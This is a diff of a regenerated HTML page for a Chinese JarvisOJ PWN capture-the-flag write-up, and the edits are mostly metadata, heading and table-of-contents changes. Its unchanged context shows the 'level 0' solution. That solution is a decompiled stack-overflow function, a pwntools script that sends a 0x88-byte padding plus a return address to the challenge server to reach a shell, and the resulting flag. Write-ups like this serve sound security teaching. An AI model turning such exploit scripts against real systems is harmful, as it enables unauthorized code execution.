@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/02-19-41.jpg">
 <meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/02-28-03.jpg">
 <meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/02-33-51.jpg">
-<meta property="og:updated_time" content="2018-02-13T12:48:49.253Z">
+<meta property="og:updated_time" content="2018-02-13T13:00:39.828Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="JarvisOJ-PWN-Writeup专题">
 <meta name="twitter:description" content="引言最近学二进制有点入魔，最近才有时间把最近写的JarvisOJ上一些Pwn题WP和得到的经验总结在此不定期更新">
@@ -204,7 +204,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/15-49-43.jpg" alt="15-49-43.jpg" title="">
-<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>最近学二进制有点入魔，最近才有时间把最近写的JarvisOJ上一些Pwn题WP和得到的经验总结在此<br>不定期更新<br><a id="more"></a></p>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>最近学二进制有点入魔，最近才有时间把最近写的JarvisOJ上一些Pwn题WP和得到的经验总结在此<br>不定期更新<br><a id="more"></a></p>
 <h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>很直接地给出了漏洞函数<code>vulnerable_function()</code>以及要溢出跳转到的函数<code>callsystem()</code>其中<code>callsystem()</code>地址为<code>0x400596</code><br><code>read</code>读入512字节但是<code>buf</code>只有0x80大小，很明显的栈溢出构造ROP劫持控制流到<code>callsystem()</code>执行<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">512u</span>LL);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <p>查看栈结构很容易得知溢出长度是<code>0x80+0x8=0x88</code><br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/18-12-02.jpg" alt="18-12-02.jpg" title=""><br>然后劫持到<code>callsystem()</code>的地址<code>0x400596</code>即可<br>poc:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9881</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)		</div><div class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">payload += p64(<span class="number">0x400596</span>)</div><div class="line">respone(<span class="string">"World\n"</span>,payload)</div><div class="line">pro.interactive()</div></pre></td></tr></table></figure></p>
 <p><strong>Flag: CTF{713ca3944e92180e0ef03171981dcd41}</strong></p>
@@ -458,11 +458,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2099/09/22/Notice/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/02/15/除夕随笔/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Notice
+          除夕随笔
         
       </div>
     </a>
@@ -496,7 +496,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#引言"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-0"><span class="toc-number">2.</span> <span class="toc-text">level 0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-1"><span class="toc-number">3.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-2"><span class="toc-number">4.</span> <span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-3"><span class="toc-number">5.</span> <span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-4"><span class="toc-number">6.</span> <span class="toc-text">level 4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#方法一"><span class="toc-number">6.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法二"><span class="toc-number">6.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-5"><span class="toc-number">7.</span> <span class="toc-text">level 5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mprotect"><span class="toc-number">7.1.</span> <span class="toc-text">mprotect</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmap"><span class="toc-number">7.2.</span> <span class="toc-text">mmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">7.3.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-6"><span class="toc-number">8.</span> <span class="toc-text">level 6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-2-x64"><span class="toc-number">9.</span> <span class="toc-text">level 2 x64</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-3-x64"><span class="toc-number">10.</span> <span class="toc-text">level 3 x64</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Test-Your-Memory"><span class="toc-number">11.</span> <span class="toc-text">Test Your Memory</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tell-me-something"><span class="toc-number">12.</span> <span class="toc-text">Tell me something</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Smashes"><span class="toc-number">13.</span> <span class="toc-text">Smashes</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary保护机制"><span class="toc-number">13.1.</span> <span class="toc-text">Canary保护机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF文件段加载或者说内存映射关系"><span class="toc-number">13.2.</span> <span class="toc-text">ELF文件段加载或者说内存映射关系</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#引言"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-0"><span class="toc-number"></span> <span class="toc-text">level 0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-1"><span class="toc-number"></span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-2"><span class="toc-number"></span> <span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-3"><span class="toc-number"></span> <span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-4"><span class="toc-number"></span> <span class="toc-text">level 4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#方法一"><span class="toc-number">1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法二"><span class="toc-number">2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-5"><span class="toc-number"></span> <span class="toc-text">level 5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mprotect"><span class="toc-number">1.</span> <span class="toc-text">mprotect</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmap"><span class="toc-number">2.</span> <span class="toc-text">mmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-6"><span class="toc-number"></span> <span class="toc-text">level 6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-2-x64"><span class="toc-number"></span> <span class="toc-text">level 2 x64</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level-3-x64"><span class="toc-number"></span> <span class="toc-text">level 3 x64</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Test-Your-Memory"><span class="toc-number"></span> <span class="toc-text">Test Your Memory</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tell-me-something"><span class="toc-number"></span> <span class="toc-text">Tell me something</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Smashes"><span class="toc-number"></span> <span class="toc-text">Smashes</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary保护机制"><span class="toc-number">1.</span> <span class="toc-text">Canary保护机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF文件段加载或者说内存映射关系"><span class="toc-number">2.</span> <span class="toc-text">ELF文件段加载或者说内存映射关系</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -654,7 +654,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">PE</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -663,10 +671,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">磁盘</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
               </li>
             
             <div class="clearfix"></div>
